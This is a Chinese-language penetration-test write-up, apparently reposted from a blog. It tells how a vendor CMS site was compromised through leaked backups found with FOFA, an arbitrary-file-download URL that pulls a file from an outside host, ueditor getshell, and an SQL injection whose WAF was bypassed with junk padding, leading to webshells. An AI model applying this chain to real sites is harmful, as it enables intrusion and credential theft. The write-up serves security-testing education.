FROM 

```
https://www.cnblogs.com/backlion/p/15770064.html
```



What I've learned:

1. FOFA -> **similiar site** -> weaker one -> p3n!
2. **Use junk data bypass WAF!!!**



---



## 0x00 使用关键词得到目标源码

某日上午接到临时安排对某公司进行渗透测试，此次渗透给的是一个主域名，并且也没有子域，打开了目标网站先对其进行一波信息收集[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103918120-1949305445.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100359-db24aaba-0f53-1.png)
中间件: IIS 8.5
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103918574-542283566.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100400-db4014f8-0f53-1.png)
输入admin发现自动添加了/
说明其目录存在，那么盲猜一波文件，login.aspx default.aspx main.aspx 等等
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103919310-1402173741.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100400-db520776-0f53-1.png)
最终在login.aspx下面发现后台登录页面。这不猜他一波弱口令？？
一顿操作过后账号被锁
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103920127-1825260822.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100400-db8e85ca-0f53-1.png)
熟悉的开局，既然如此只能尝试其他方法了。
在主页的html代码中发现了某处信息
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103920974-1940392655.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100400-dba23bba-0f53-1.png)
设计制作？根据后面的域名访问过去，是一个建站公司
那么，入手点来了。IIS8.5+ASP.NET+建站系统
先扫一波备份文件:
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103921425-155429375.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100400-dbb39a36-0f53-1.png)
400多条ip这开发商还行。使用FOFA查询工具，批量导出
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103921829-1448871529.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100400-dbc83694-0f53-1.png)
然后我们来扫一下备份文件。这里推荐我B哥的扫描器
https://github.com/broken5/WebAliveScan
可以进行批量存活扫描和目录扫描
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103922341-218058023.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100401-dbe023d0-0f53-1.png)
在好几个站下面发现web.zip备份文件。
下载下来过后，对其目标站点文件进行了对比。基本一致
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103922901-1069820455.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100401-dbf86350-0f53-1.png)

## 0x01 拿到代码开始审计多次碰壁

那么开始审计。
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103923815-1139109272.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100401-dc0d3280-0f53-1.png)
在某接口处放下敏感操作 WebClient.DownloadFile (远程文件下载)
由于该方法需要提供绝对路径。。比较头疼，但我跟踪相关参数。发现。
在另一个方法中调用了该方法。
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103924399-1355850887.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100401-dc2bce16-0f53-1.png)
并传入Server.MapPath，这根本不需要找绝对路径了系统都给你安排好了。
那么构造POC:
ashx/api.ashx?m=downloadfile&FilePath=asmx.jpg&WebUrl=http://***.cn/
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103925555-1905383795.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100401-dc3c75ae-0f53-1.png)
访问地址:
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103926268-1173007218.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100401-dc4d5c3e-0f53-1.png)
文件存在，那么证明可行
回到目标地址:
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103926962-1035196824.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100401-dc5dc542-0f53-1.png)
被修复了文件不存在
继续回到代码中,审计其他漏洞在其他接口中，也均存在多个漏洞。如ueditor远程抓取漏洞
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103927586-1941905001.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100401-dc6f7396-0f53-1.png)
文件重命名可Getshell

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103928097-1137720979.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016110101-d2b162c6-0f5b-1.png)

但是这些接口都需要登录
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103928670-62149113.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100402-dc9959f4-0f53-1.png)
这就很头疼了,打算在一些无需登录的接口中尝试寻找SQL注入。
最终在某处发现SQL拼接。
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103929492-118196344.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100402-dcb25bde-0f53-1.png)
但是这里调用了IsSafeSqlString检测
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103930051-247295581.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100402-dcc88db4-0f53-1.png)
常见符号基本被卡的死死的

## 0x02 拿下开发商寻找通用账号逆向加解密算法

由于都是使用了相同的建站程序,怀疑有程序内置账户
于是准备通过刚才审计出来的漏洞。从同程序的站点入手
最终在某个站点成功拿到Webshell
看了下相关信息
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103930560-496241117.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100402-dcde8c86-0f53-1.png)
居然是厂商的演示站群，存了该开发商所有站点源码。
应该是在开发过程中的演示环境吧站点有很多，估计每个客户都有。
在服务器里翻到了目标站点的演示网站
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103931009-71314533.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100402-dcee1908-0f53-1.png)
根目录下有zip网站备份和sql 数据库备份。
如果说目标站点是直接搬迁过去的，那么后台账户密码应该是一样的。
将其SQL文件下载下来。再其中搜索相关信息
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103931570-1846651994.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100402-dd0676ba-0f53-1.png)
发现了插入账户的SQL语句。其密码是加密过的
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103932232-1921050966.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100403-dd17af84-0f53-1.png)
cmd5解不开，看了下密文是33位加密。
但是登录过程中，密码是RSA加密过后传输的，而后端居然是33位的md5加密
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103932633-1127137167.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100403-dd25f6ca-0f53-1.png)
因为有源代码，追踪了一下登录了相关方法。
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103933554-2142229781.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100403-dd448ae0-0f53-1.png)
密码传入后，调用了CommFun.EnPwd进行了一次加密。
追踪EnPwd方法
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103934086-1207557966.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100403-dd5747fc-0f53-1.png)
可以看到，传入进来的密码是RSA类型，先进行了一次RSA解密，然后进行了一次DES加密。
追踪DESEncrypt.Encrypt方法。
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103934466-1892231958.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100403-dd644f24-0f53-1.png)
这里是将Encrypt方法封装了一下，并传入加密key。
其核心加密方法为下：
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103934918-1778582804.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100403-dd781db0-0f53-1.png)
并且，在该类里。还定义了解密方法
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103935511-1781289920.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100403-dd929ac8-0f53-1.png)
得到了加密方法和解密方法以及key。那么只需要将其单独拉出来调用就可以了。
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103936101-1935894672.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100404-ddae7f72-0f53-1.png)
将得到加密字符进行解密，得到结果
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103936660-850388884.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100404-ddcf128c-0f53-1.png)
尝试登录
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103938164-373416304.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100404-de1994ba-0f53-1.png)
忙活半天，白干了。

## 0x03 柳暗花明拿下目标shell

已经下午4点了。还是一无进展，准备尝试绕过SQL过滤。
就在这时候，我发现了一处SQL注入点。
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103938695-190719613.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100404-de316c84-0f53-1.png)
某方法接收了两个参数，却只对一个参数进行了过滤。
在目标网站上测验
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103939091-740130853.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100405-de43d41e-0f53-1.png)
存在注入，发现存在waf使用垃圾参数填充成功绕过waf

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103939954-426082430.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016111453-c26df40e-0f5d-1.png)

直接上sqlmap安心的跑，得到系统账户以及密文
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103940604-42722927.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100405-de870018-0f53-1.png)
将得到的密文进行解密，得到结果

[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103941431-713547984.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016110757-cabf4208-0f5c-1.png)

尝试登录。这下总对了吧!
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103941866-739496859.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100405-deb17460-0f53-1.png)
终于进来了！！！！
经过之前的审计，发现了很多接口都存在漏洞，现在成功登录了。岂不是随便getshell？
直接ueditor带走。
[![img](https://img2020.cnblogs.com/blog/1049983/202201/1049983-20220106103942350-1890359523.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201016100405-ded29f78-0f53-1.png)
成功shell

## 0x04 总结

1.在目标网址后加入admin显示管理后台，并在网站底部查询到该网站的CMS信息

2.通过fofa批量搜索该CMS的其他网站： body="xxxx系统”&country="CN"

3.通过fofa查询工具批量导出查询的网站网址

4.通过WebAliveScan对导出网站网址进行批量敏感目录扫描，并发现其中一个网站存在源代码压缩包泄露。

5.对网站源码进行本地代码审计，发现以下漏洞：

存在任意文件下载漏洞，不需要登录

ashx/api.ashx?m=downloadfile&FilePath=asmx.jpg&WebUrl=http://***.cn/

ueditor编辑器远程文件下载漏洞，需要登录

存在SQL注入漏洞，需要登录，且被过滤了

6.通过任意文件下载漏洞拿到其中一个网址的webshell，发现是产商的演示的站群系统。

7.通过webshell发现站群中每个网站根目录下有zip网站备份和sql 数据库备份，SQL语句中包含插入的用户名和密码（密码为33位），站群的所有登录基本上都使用相同的用户名和密码

8.通过源代码分析发现登录处是通过RSA+DES加密，并在源码中找到加密的方法和KEY值

10.通过源代码中加密方法写出解密方法，并解密出HASH值，但是登录，是无法登录

11.通过源代码审计又发现一处SQL注入，这里通过垃圾填充数据让WAF拦截，进行注入，通过SQLMAP跑出用户名的用户和密码

，通过上面的解密方法，对其密码hash值解密，最终得到了明文密码

12.通过得到的用户名和密码登录系统，然后通过ueditor编辑器远程文件下载获得目标系统的webshell